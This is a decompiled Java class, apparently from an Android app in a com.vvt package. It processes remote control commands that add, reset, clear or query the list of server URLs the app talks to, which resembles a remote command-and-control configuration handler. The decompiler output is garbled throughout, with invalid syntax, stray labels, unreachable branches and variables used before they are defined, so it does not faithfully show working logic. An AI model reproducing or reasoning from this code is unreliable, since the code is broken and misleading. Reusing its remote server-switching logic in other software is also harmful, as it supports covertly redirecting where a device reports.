package com.vvt.appengine.a;

import android.webkit.URLUtil;

import com.vvt.appengine.AppEngine1;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import com.vvt.server_address_manager.b;
import java.util.Iterator;
import java.util.List;

public class p
{
  private static final boolean a = a.a;
  private RmtCtrlOutputStatusMessage b;
  private AppEngine1 c;
  
  public p()
  {
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    localRmtCtrlOutputStatusMessage.<init>();
    this.b = localRmtCtrlOutputStatusMessage;
  }
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject1;
    Object localObject7;
    boolean bool5;
    label416:
    Object localObject5;
    for (;;)
    {
      int j;
      int k;
      RemoteFunction localRemoteFunction;
      boolean bool3;
      boolean bool1;
      boolean bool4;
      int n;
      try
      {
        this.c = paramh;
        localObject1 = paramControlCommand.getFunction();
        Object localObject2 = this.c;
        localObject6 = ((AppEngine1)localObject2).r;
        try
        {
          localObject7 = ((b)localObject6).e();
          localObject2 = paramControlCommand.getData();
          localObject2 = (List)localObject2;
          int i = ((List)localObject7).size();
          j = ((b)localObject6).f();
          k = ((List)localObject2).size();
          boolean bool2 = a;
          if (bool2) {}
          localRemoteFunction = RemoteFunction.ADD_URL;
          if (localObject1 != localRemoteFunction) {
            break label416;
          }
          int m = i + k;
          if (j < m)
          {
            localObject2 = this.b;
            m = 0;
            localObject1 = null;
            ((RmtCtrlOutputStatusMessage)localObject2).setSuccess(false);
            localObject2 = this.b;
            localObject1 = "Cannot add url to list. Maximum capacity reached.";
            ((RmtCtrlOutputStatusMessage)localObject2).setMessage((String)localObject1);
            localObject2 = this.b;
            return (RmtCtrlOutputStatusMessage)localObject2;
          }
          localObject7 = ((List)localObject2).iterator();
          bool3 = ((Iterator)localObject7).hasNext();
          if (bool3)
          {
            localObject1 = ((Iterator)localObject7).next();
            localObject1 = (String)localObject1;
            bool1 = URLUtil.isHttpUrl((String)localObject1);
            if (bool1) {
              continue;
            }
            localObject2 = this.b;
            bool4 = false;
            localObject6 = null;
            ((RmtCtrlOutputStatusMessage)localObject2).setSuccess(false);
            localObject2 = this.b;
            localObject6 = "Invalid url %s.";
            n = 1;
            localObject7 = new Object[n];
            bool1 = false;
            localObject7[0] = localObject1;
            localObject1 = String.format((String)localObject6, (Object[])localObject7);
            ((RmtCtrlOutputStatusMessage)localObject2).setMessage((String)localObject1);
            localObject2 = this.b;
            continue;
          }
          localObject1 = ((List)localObject2).iterator();
          bool5 = ((Iterator)localObject1).hasNext();
          if (!bool5) {
            continue;
          }
          localObject2 = ((Iterator)localObject1).next();
          localObject2 = (String)localObject2;
          ((b)localObject6).a((String)localObject2);
          continue;
          bool5 = a;
        }
        catch (Exception localException)
        {
          localObject1 = this.b;
          bool4 = false;
          localObject6 = null;
          ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(false);
          localObject1 = this.b;
          localObject3 = localException.getMessage();
          ((RmtCtrlOutputStatusMessage)localObject1).setMessage((String)localObject3);
        }
        if (bool5) {}
        bool5 = a;
        if (bool5) {}
        Object localObject3 = this.b;
        continue;
        localObject3 = this.b;
        bool3 = true;
        ((RmtCtrlOutputStatusMessage)localObject3).setSuccess(bool3);
        localObject3 = this.b;
        localObject1 = "";
        ((RmtCtrlOutputStatusMessage)localObject3).setMessage((String)localObject1);
        continue;
        localRemoteFunction = RemoteFunction.RESET_URL;
      }
      finally {}
      if (localObject1 == localRemoteFunction)
      {
        if (j < k)
        {
          localObject5 = this.b;
          bool3 = false;
          localObject1 = null;
          ((RmtCtrlOutputStatusMessage)localObject5).setSuccess(false);
          localObject5 = this.b;
          localObject1 = "Cannot add url to list. Maximum capacity reached.";
          ((RmtCtrlOutputStatusMessage)localObject5).setMessage((String)localObject1);
          localObject5 = this.b;
        }
        else
        {
          localObject7 = ((List)localObject5).iterator();
          do
          {
            bool3 = ((Iterator)localObject7).hasNext();
            if (!bool3) {
              break;
            }
            localObject1 = ((Iterator)localObject7).next();
            localObject1 = (String)localObject1;
            bool1 = URLUtil.isHttpUrl((String)localObject1);
          } while (bool1);
          localObject5 = this.b;
          bool4 = false;
          localObject6 = null;
          ((RmtCtrlOutputStatusMessage)localObject5).setSuccess(false);
          localObject5 = this.b;
          localObject6 = "Invalid url %s.";
          n = 1;
          localObject7 = new Object[n];
          bool1 = false;
          localObject7[0] = localObject1;
          localObject1 = String.format((String)localObject6, (Object[])localObject7);
          ((RmtCtrlOutputStatusMessage)localObject5).setMessage((String)localObject1);
          localObject5 = this.b;
          continue;
          ((b)localObject6).d();
          localObject1 = ((List)localObject5).iterator();
          for (;;)
          {
            bool5 = ((Iterator)localObject1).hasNext();
            if (!bool5) {
              break;
            }
            localObject5 = ((Iterator)localObject1).next();
            localObject5 = (String)localObject5;
            ((b)localObject6).a((String)localObject5);
          }
          localObject5 = this.b;
          bool3 = true;
          ((RmtCtrlOutputStatusMessage)localObject5).setSuccess(bool3);
          localObject5 = this.b;
          localObject1 = "";
          ((RmtCtrlOutputStatusMessage)localObject5).setMessage((String)localObject1);
        }
      }
      else
      {
        localObject5 = RemoteFunction.CLEAR_URL;
        if (localObject1 == localObject5)
        {
          ((b)localObject6).d();
          localObject5 = this.b;
          bool3 = true;
          ((RmtCtrlOutputStatusMessage)localObject5).setSuccess(bool3);
          localObject5 = this.b;
          localObject1 = "";
          ((RmtCtrlOutputStatusMessage)localObject5).setMessage((String)localObject1);
        }
        else
        {
          localObject5 = RemoteFunction.QUERY_URL;
          if (localObject1 == localObject5)
          {
            localObject1 = new java/lang/StringBuilder;
            ((StringBuilder)localObject1).<init>();
            localObject5 = "Server URL:";
            ((StringBuilder)localObject1).append((String)localObject5);
            if (bool1) {
              break;
            }
            localObject5 = "line.separator";
            localObject5 = System.getProperty((String)localObject5);
            ((StringBuilder)localObject1).append((String)localObject5);
            localObject5 = "None";
            ((StringBuilder)localObject1).append((String)localObject5);
            localObject5 = this.b;
            bool4 = true;
            ((RmtCtrlOutputStatusMessage)localObject5).setSuccess(bool4);
            localObject5 = this.b;
            localObject1 = ((StringBuilder)localObject1).toString();
            ((RmtCtrlOutputStatusMessage)localObject5).setMessage((String)localObject1);
          }
        }
      }
    }
    Object localObject6 = ((List)localObject7).iterator();
    for (;;)
    {
      bool5 = ((Iterator)localObject6).hasNext();
      if (!bool5) {
        break;
      }
      localObject5 = ((Iterator)localObject6).next();
      localObject5 = (String)localObject5;
      localObject7 = "line.separator";
      localObject7 = System.getProperty((String)localObject7);
      ((StringBuilder)localObject1).append((String)localObject7);
      ((StringBuilder)localObject1).append((String)localObject5);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/p.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */